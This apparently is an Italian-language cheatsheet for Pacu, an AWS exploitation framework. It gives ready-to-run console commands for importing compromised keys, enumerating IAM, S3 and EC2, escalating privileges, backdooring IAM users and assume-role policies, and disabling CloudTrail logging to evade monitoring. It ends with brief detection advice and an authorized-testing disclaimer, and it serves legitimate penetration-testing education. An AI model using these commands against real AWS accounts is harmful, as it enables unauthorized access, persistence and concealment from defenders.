<!-- language-home-navigation -->
[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# ☁️ Pacu - Cheatsheet completo

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ██████╗  █████╗  ██████╗██╗   ██╗
  ██╔══██╗██╔══██╗██╔════╝██║   ██║
  ██████╔╝███████║██║     ██║   ██║
  ██╔═══╝ ██╔══██║██║     ██║   ██║
  ██║     ██║  ██║╚██████╗╚██████╔╝
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
       The AWS Exploitation Framework by Rhino Security Labs
```
<palign="centro">
  <img src="https://img.shields.io/badge/Pacu-AWS_Exploitation-blue?style=for-the-badge" alt="Pacu">
  <img src="https://img.shields.io/badge/Author-Rhino_Security_Labs-orange?style=for-the-badge" alt="Rhino Security Labs">
  <img src="https://img.shields.io/badge/Platform-Amazon_Web_Services-gold?style=for-the-badge" alt="AWS">
  <img src="https://img.shields.io/badge/Category-Cloud_Security-green?style=for-the-badge" alt="Sicurezza cloud">
</p>

<palign="centro">
  <b>☁️ Il framework di sfruttamento AWS open source progettato per test di penetrazione in ambienti cloud, escalation di privilegi, raccolta di credenziali e ricognizione dell'infrastruttura</b>
</p>

---

## 📋 Sommario

- [Panoramica e architettura](#-panoramica--architettura)
- [Installazione](#-installazione)
- [Gestione delle sessioni e importazione di chiavi AWS](#-session-management--aws-key-import)
  - [Importazione credenziali compromesse](#importazione-credenziali-compromesse)
  - [Ruoli assunti e token di sessione](#ruoli-assunti-e-token-di-sessione)
- [Moduli di ricognizione ed enumerazione](#-reconnaissance--enumeration-modules)
  - [Enumerazione delle autorizzazioni IAM attuali](#enumerazione-permessi-iam-correnti)
  - [Scansione di istanze EC2 e bucket S3](#scanning-ec2-instances--s3-bucket)
- [Tecniche di escalation dei privilegi in AWS](#-privilege-escalation-techniques-in-aws)
  - [Scanner automatico dell'escalation dei privilegi](#automatic-privilege-escalation-scanner)
  - [Esecuzione dei moduli di escalation](#executing-escalation-modules)
- [Persistenza ed evasione della difesa](#-persistenza--evasione della difesa)
  - [Ruoli e utenti IAM backdooring](#backdooring-iam-roles--users)
  - [Interruzione della registrazione CloudTrail](#disrupting-cloudtrail-logging)
- [Tabella di riferimento rapido](#-tabella-di-riferimento-rapido)
- [Considerazioni difensive e rilevamento](#-considerazioni-difensive--rilevamento)
- [Disclaimer legale](#-legal-disclaimer)

---

## 🎯 Panoramica e architettura

Creato da **Rhino Security Labs**, **Pacu** è il "Metasploit per AWS". È progettato per emulare tattiche contraddittorie all'interno degli ambienti Amazon Web Services.

Pacu opera utilizzando un database SQLite locale che mantiene lo stato durante le sessioni offensive:
- **Pipeline modulare:** Oltre 40 moduli specializzati che coprono scoperta, movimento laterale, escalation di privilegi, persistenza ed esfiltrazione.
- **Enumerazione delle autorizzazioni:** analizza le policy IAM senza attivare soglie di avviso testando le azioni API o esaminando le policy gestite allegate.
- **Automazione Privesc:** valuta i percorsi di escalation delle autorizzazioni IAM noti (come `iam:CreateAccessKey`, `iam:PassRole`, `iam:AttachUserPolicy`).

---

## 📥Installazione
```bash
# Clone the repository
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu

# Install dependencies in virtual environment
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

# Launch Pacu console
python3 pacu.py
```
---

## 🔑 Gestione delle sessioni e importazione delle chiavi AWS

All'avvio di Pacu, accedi a una console interattiva. Crea o seleziona una sessione:
```text
Pacu > set_session client_assessment
```
### Importazione di credenziali compromesse
```text
Pacu (client_assessment) > set_keys
Enter Key Alias: compromised_dev
Enter AWS Access Key ID: AKIAIOSFODNN7EXAMPLE
Enter AWS Secret Access Key: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Enter AWS Session Token (Optional): 
Enter Default Region: us-east-1
```
### Ruoli assunti e token di sessione
```text
# Switch active keys within the session
Pacu (client_assessment) > swap_keys
```
---

## 🔍 Moduli di ricognizione ed enumerazione

### Enumerazione delle autorizzazioni IAM correnti
Determina chi sei e cosa possono fare le credenziali attive:
```text
# Query caller identity and enumerate attached user/group/role policies
Pacu (client_assessment) > run iam__enum_permissions
Pacu (client_assessment) > whoami
```
### Scansione di istanze EC2 e bucket S3
```text
# Enumerate all EC2 instances and security groups
Pacu (client_assessment) > run ec2__enum

# Enumerate accessible S3 buckets and identify public read/write permissions
Pacu (client_assessment) > run s3__enum
```
---

## ⚡ Tecniche di escalation dei privilegi in AWS

L'escalation dei privilegi AWS si basa su policy IAM configurate in modo errato che consentono agli utenti non amministrativi di concedere a se stessi o ad altre entità diritti amministrativi.

### Scanner automatico dell'escalation dei privilegi
Esegue la scansione delle autorizzazioni enumerate rispetto a oltre 21 vettori privesc AWS documentati:
```text
Pacu (client_assessment) > run iam__privesc_scan
```
*L'output di esempio evidenzia autorizzazioni vulnerabili come `iam:PutUserPolicy`, `iam:AttachUserPolicy` o `iam:CreateAccessKey`.*

### Esecuzione dei moduli di escalation
```text
# Exploit iam:AttachUserPolicy to attach AdministratorAccess
Pacu (client_assessment) > run iam__privesc_scan --exec

# Exploit iam:CreateAccessKey to create keys for another high-priv user
Pacu (client_assessment) > run iam__backdoor_users_keys --username target_admin
```
---

## 🛡️ Persistenza ed evasione della difesa

### Backdooring di ruoli e utenti IAM
```text
# Add a new access key to an existing user for persistent access
Pacu (client_assessment) > run iam__backdoor_users_keys --username backup_service

# Modify assume-role trust policy to allow external account access
Pacu (client_assessment) > run iam__backdoor_assume_role --role-name ProductionSupport --external-account-id 123456789012
```
### Interruzione della registrazione CloudTrail
```text
# Identify CloudTrail trails
Pacu (client_assessment) > run cloudtrail__enum

# Stop logging on active trails to blind SOC monitors
Pacu (client_assessment) > run cloudtrail__disrupt_logging --trail-name CorpSecurityTrail
```
---

## ⚡ Tabella di consultazione rapida

| Obiettivo | Comando Pacu |
|-----------|--------------|
| **Imposta/Seleziona sessione** | `set_session <NAME>` |
| **Importa credenziali AWS** | `set_keys` |
| **Mostra identità attuale** | `whoami` |
| **Elencare i diritti IAM** | `run iam__enum_permissions` |
| **Scansiona vettori Privesc** | `run iam__privesc_scan` |
| **Elencare i bucket S3** | `run s3__enum` |
| **Enumera istanze EC2** | `run ec2__enum` |
| **Interrompere CloudTrail** | `run cloudtrail__disrupt_logging` |
| **Elenco moduli disponibili** | `list` |

---

## 🛡️ Considerazioni difensive e rilevamento

1. **Monitoraggio GuardDuty e CloudTrail:** l'escalation automatizzata dei privilegi e la scansione delle autorizzazioni di Pacu generano query API sequenziali rapide facilmente contrassegnate da AWS GuardDuty.
2. **SCP e limiti di autorizzazione:** applica policy di controllo dei servizi (SCP) di AWS Organizations per impedire a qualsiasi entità, inclusi gli amministratori completi, di manomettere CloudTrail o modificare le strutture dell'organizzazione root.

---

## ⚠️ Disclaimer legale

> [!ATTENZIONE]
> Pacu è progettato specificamente per test di penetrazione AWS autorizzati e valutazioni di sicurezza. Testare gli account cloud senza previa autorizzazione esplicita da parte del proprietario della risorsa viola la politica di utilizzo accettabile di Amazon Web Services e il diritto internazionale.